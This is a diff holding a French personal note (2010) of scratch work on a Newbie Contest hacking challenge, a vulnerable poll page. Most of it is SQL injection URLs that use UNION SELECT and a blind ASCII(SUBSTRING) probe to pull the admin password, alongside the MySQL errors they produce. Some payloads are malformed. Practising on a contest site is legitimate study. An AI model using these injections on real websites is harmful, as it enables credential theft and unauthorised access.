@@ -1,0 +1,80 @@
+
+Message précédentMessage suivantRetour aux messages
+newbie hack grand sondage hebdomadaire‏
+newbie hack grand sondage hebdomadaire
+akway toocurious
+08/04/2010
+[Conserver ce message en haut de votre boîte de réception]
+À : akway
+sondage/js/test1.js
+function verifcookie(id) {
+    if (document.cookie.length != 0)
+    {
+        if (document.cookie.indexOf(id+'=1') != -1) return true;
+        else return false;
+    }
+    else return false;
+
+----------a tester en injection --------
+document.cookie.indexOf( id+'=1') != -1)
+
+
+administration/admin.php
+    <form name="identification" action="admin.php" method="post" onSubmit="return verif_form()">
+    Login<br />
+    <input type="text" name="login" size="16"><br /><br />
+
+    Mot de passe<br />
+    <input type="text" name="pass" size="16"><br /><br /><br />
+    <input type="submit" value="Connexion">
+    </form>
+
+_____________
+
+http://hacking.newbiecontest.org:10080/ep16/sondage/poll.php?id=3 UNION SELECT pass FROM admin WHERE login=1
+==>
+SELECT question,rep1,rep2,rep3,rep4,n1,n2,n3,n4 FROM sondage WHERE id=3 UNION SELECT pass FROM admin WHERE login=1
+The used SELECT statements have a different number of columns
+Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /www/ep16/sondage/poll.php on line 42
+
+pour solutionner ce probleme il suffit de passer autant de parametres dans la requete SQL injectée que dans celle initiallement prevue soit :
+
+http://hacking.newbiecontest.org:10080/ep16/sondage/poll.php?id=3 UNION SELECT pass,pass,pass,pass,pass,pass,pass,pass,pass FROM admin WHERE 1
+
+http://hacking.newbiecontest.org:10080/ep16/sondage/poll.php?id=3 UNION UPDATE sondage SET rep1=pass WHERE 1
+-----------
+
+SELECT question,rep1,rep2,rep3,rep4,n1,n2,n3,n4 FROM sondage WHERE id=3 UNION SELECT pass,pass,pass,pass,pass,pass,pass,pass,pass FROM admin WHERE 1 INTO OUTFILE `./aaa`
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`./aaa`' at line 1
+Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /www/ep16/sondage/poll.php on line 42
+
+Warning: fopen(js/test3 UNION SELECT pass,pass,pass,pass,pass,pass,pass,pass,pass FROM admin WHERE 1 INTO OUTFILE `./aaa`.js) [function.fopen]: failed to open stream: No such file or directory in /www/ep16/sondage/poll.php on line 109
+
+Warning: fclose(): supplied argument is not a valid stream resource in /www/ep16/sondage/poll.php on line 111
+
+
+ùùùùùùùùùùùùùùùùùù
+http://hacking.newbiecontest.org:10080/ep16/sondage/poll.php?id=3 UNION SELECT pass,pass,pass,pass,pass,pass,pass,pass,pass FROM admin WHERE 1 AND ASCII(SUBSTRING(pass,,1))=102
+
+fouille pas dans les tables
+
+
+((((((((((((((((mooooooooore ))))))))))
+
+http://hacking.newbiecontest.org:10080/ep16/sondage/poll.php?id=1 UNION SELECT pass AS question,pass AS rep1,pass AS rep2,pass AS rep3,pass AS rep4,pass AS n1,pass AS n2,pass AS n3,pass AS n4 FROM admin
+
+
+http://hacking.newbiecontest.org:10080/ep16/sondage/poll.php?id=1 UNION SELECT pass AS question,pass,pass,pass,pass,pass,pass,pass,pass FROM admin
+
+
+
+
+http://hacking.newbiecontest.org:10080/ep16/sondage/poll.php?id=1 UNION SELECT pass AS question,pass,pass,pass,pass,pass,pass,pass,pass FROM admin
+
+
+
+
+
+
+
+
